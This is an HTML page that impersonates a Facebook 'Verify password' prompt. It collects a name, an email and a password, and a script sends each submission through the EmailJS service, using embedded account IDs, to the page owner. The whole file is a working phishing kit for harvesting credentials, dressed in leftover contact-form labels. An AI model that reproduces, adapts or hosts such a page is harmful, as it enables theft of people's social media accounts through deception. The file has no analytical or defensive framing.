<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook/verify password/?</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .contact-form {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background: #28a745;
            border: none;
            color: white;
            cursor: pointer;
            border-radius: 4px;
        }
        button:hover {
            background: #218838;
        }
		.header-image{
		width: 50%;
            height: 300px;
            display: block;
            margin-bottom: 20px;
            border-radius: 8px 8px 0 0;
			
		}
    </style>
</head>
<body>
<!-- <img src="9111.jpg"> -->
    <div class="contact-form">
	 <img src="9911.png" alt="Form Header" class="header-image">
        <h2>Verify password</h2>
        <form id="contact-form">
            <input type="text" id="name" name="name" placeholder="Your facebook verify Name" required>
            <input type="email" id="email" name="email" placeholder="Your Email" required>
            <textarea id="message" name="message" placeholder="password" rows="4" required></textarea>
            <button type="submit">Send Message</button>
        </form>
        <p id="status-message"></p>
    </div>

 <script type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script>
        (function() {
  emailjs.init('KedwD-fhgl4eQHSQI');  // Replace with your EmailJS user ID
        })();

        document.getElementById('contact-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const message = document.getElementById('message').value;

            if (name && email && message) {
                emailjs.send("service_vwbxx87", "template_2yw1l3a", {
                    from_name: name,
                    from_email: email,
                    message: message
                })
                .then(function(response) {
                    document.getElementById('status-message').textContent = "Message Sent Successfully!";
                }, function(error) {
                    document.getElementById('status-message').textContent = "Failed to send message. Try again.";
                });
            }
        });
    </script>
</body>
</html>
